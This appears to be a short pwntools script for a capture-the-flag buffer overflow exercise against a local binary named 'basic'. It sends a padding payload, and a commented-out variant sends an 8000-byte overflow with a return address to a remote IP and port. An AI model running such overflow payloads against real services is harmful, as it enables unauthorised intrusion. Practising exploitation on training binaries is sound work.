#!/usr/bin/env python3
from pwn import *

# context.terminal = ['tmux','splitw','-h']
# context(os='windows',arch='arm',log_level='debug')

p = process("./basic")

offset = 32
winAddr = 0x08049233

payload = "A".encode() * offset + 'B'.encode()

p.sendline(payload)

p.interactive()

# from pwn import *

# # context(log_level='debug')

# p = remote('13.210.180.94',12345)

# payload = 'A' * 8000 + '\x56\x86\x04\x08'
# p.send(payload)
# p.interactive()